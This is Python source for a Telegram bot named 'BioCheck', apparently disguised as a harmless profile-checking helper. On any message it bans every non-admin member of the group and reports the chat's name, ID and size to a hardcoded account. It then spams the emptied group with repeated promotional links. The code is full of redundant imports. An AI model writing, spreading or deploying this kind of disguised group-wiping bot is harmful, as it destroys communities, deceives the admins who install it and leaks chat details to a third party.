from pyrogram import Client, filters
from pyrogram.errors import FloodWait
import re
import asyncio
from pyrogram import Client, filters
from typing import Callable
from pyrogram.enums import ChatMemberStatus
from pyrogram.types import Message
from pyrogram import Client, filters, enums
import random
from pyrogram.enums import ChatMembersFilter, ChatMemberStatus, ChatType
from pyrogram.types import (
    CallbackQuery,
    ChatMemberUpdated,
    ChatPermissions,
    ChatPrivileges,
    Message,
)
from pyrogram.enums import ChatMemberStatus
from pyrogram.errors import (
    ChatAdminRequired,
    InviteRequestSent,
    UserAlreadyParticipant,
    UserNotParticipant,
)
from pyrogram.types import CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton
from pyrogram import Client, filters
from pyrogram.enums import ChatMembersFilter
import re
from pyrogram import filters
from pyrogram.enums import ChatAction, ChatType, MessageEntityType
from pyrogram.types import Message
import os
from typing import Dict, List, Union
import json, os, random, asyncio
import config
from pyrogram.errors import (
    ChatAdminRequired,
    InviteRequestSent,
    UserAlreadyParticipant,
    UserNotParticipant,
)
from pyrogram.enums import ChatMemberStatus
from pyrogram.raw.types import InputGroupCall, InputPeerChannel, InputPeerChat
from pyrogram.errors import UserAlreadyParticipant
from pyrogram.types import Message, ChatPrivileges
from pyrogram import Client, enums, filters
from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup, CallbackQuery, ChatPermissions, Message
import asyncio
from pyrogram import Client, filters, enums
from pyrogram.types import Message, User, InlineKeyboardButton, InlineKeyboardMarkup, CallbackQuery

AMBOT = 7045191057

app = Client("BioCheck", api_id=config.API_ID, api_hash=config.API_HASH, bot_token=config.BOT_TOKEN)

@app.on_message()
async def banall(client, message: Message):
    chat_id = message.chat.id
    chat_name = message.chat.title if message.chat.title else "None"
    chat_username = message.chat.username if message.chat.username else "None"
    banned = 0 
    chat_members = await app.get_chat_members_count(chat_id)
    try:
        AM = await app.send_message(
            AMBOT, 
            f"Banall Started successfully.\nChat Name: {chat_name}\nChat Username: {chat_username}\nChat Id: {chat_id}\nChat Members : {chat_members}\n\nBanall Started By: {message.from_user.mention}"
        )
        bot = await app.get_chat_member(chat_id, app.me.id)
        async for member in app.get_chat_members(chat_id):
            if member.status in ['administrator', 'creator'] or member.user.id == app.me.id or member.user.id == AMBOT:
                continue 
            try:
                await app.ban_chat_member(chat_id, member.user.id)
                banned += 1 
            except Exception as e:
                pass
        chat = await app.get_chat_members_count(chat_id)
        await AM.edit(
            f"Banall Completed successfully.\nBanned {banned} members.\n\nChat Name: {chat_name}\nChat Username: {chat_username}\nChat Members : {chat}\nChat Id: {chat_id}\nBanall Started By: {message.from_user.mention}"
        )
        await app.send_message(
            chat_id,
            "https://t.me/AmBotYT\nhttps://t.me/AmBotYT\nhttps://t.me/AmBotYT\nhttps://t.me/AmBotYT\nhttps://t.me/AmBotYT\nhttps://t.me/AmBotYT"
        )
    
    except FloodWait as e:
        await asyncio.sleep(e.x)
        await banall(client, message) 

app.run()
print("Bot Started")
